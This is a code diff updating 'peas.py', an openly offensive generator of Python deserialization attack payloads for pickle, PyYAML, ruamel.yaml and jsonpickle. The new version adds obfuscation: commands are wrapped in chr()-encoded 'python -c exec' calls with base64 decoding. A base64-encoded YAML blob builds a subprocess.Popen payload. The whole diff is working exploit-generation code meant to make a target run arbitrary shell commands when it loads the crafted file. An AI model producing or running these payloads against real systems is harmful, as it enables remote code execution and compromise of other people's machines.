@@ -1,6 +1,6 @@
 # Python Deserialization attack payload file generator for pickle ,pyYAML, ruamel.yaml and jsonpickle module by j0lt
 # Requirements : Python 3.x , modules jsonpickle, pyyaml
-# Version : 2.2
+# Version : 2.3
 # Usage : python peas.py
 
 import pickle
@@ -24,25 +24,30 @@ class Payload(object):
         self.location = location
         self.base = base
         self.os = os
-        self.cmd = c if self.os == 'linux' else "cmd.exe /c " + c
+        self.prefix = '' if self.os == 'linux' else "cmd.exe /c "
+        self.cmd = self.prefix+c
         self.payload = b''
+        self.quotes = True if "\'" in self.cmd or "\"" in self.cmd else False
 
     def pick(self):
+        self.case()
         self.payload = pickle.dumps(Gen(tuple(self.cmd.split(" "))))
         self.payload = self.verifyencoding()
         self.savingfile("_pick")
 
     def ya(self):
-        self.payload = bytes(yaml.dump(Gen(tuple(self.cmd.split(" ")))), 'utf-8')
-        if "\'" in self.cmd or "\"" in self.cmd:
+        if self.quotes:
             self.payload = b64decode("ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0g"
                                      "cHl0aG9uCiAgLSAtYwogIC0gIl9faW1wb3J0X18oJ29zJykuc3lzdGVtKHN0cihfX2ltcG9ydF9fKCdiY"
                                      "XNlNjQnKS5iNjRkZWNvZGUoJw==") + b64encode(bytes(self.cmd, 'utf-8')) + \
                            b64decode("JykuZGVjb2RlKCkpKSI=")
+        else:
+            self.payload = bytes(yaml.dump(Gen(tuple(self.cmd.split(" ")))), 'utf-8')
         self.payload = self.verifyencoding()
         self.savingfile("_yaml")
 
     def js(self):
+        self.case()
         self.payload = bytes(jsonpickle.encode(Gen(tuple(self.cmd.split(" ")))),
                              'utf-8')
         self.payload = self.verifyencoding()
@@ -56,6 +61,18 @@ class Payload(object):
 
     def savingfile(self, suffix):
         open(self.location.__add__(suffix), "wb").write(self.payload)
+
+    def chr_encode(self, data):
+        d = '+'.join(['chr('+str(ord(ii))+')' for ii in data])
+        return d
+
+    def case(self):
+        if self.quotes:
+            self.cmd = self.prefix+"python -c exec({})".format(self.chr_encode("__import__('os').system"
+                                                                               "(__import__('base64').b64decode({})"
+                                                                               ".decode('utf-8'))".
+                                                                               format(b64encode(bytes(self.cmd, 'utf-8')
+                                                                                                ))))
 
 
 if __name__ == "__main__":
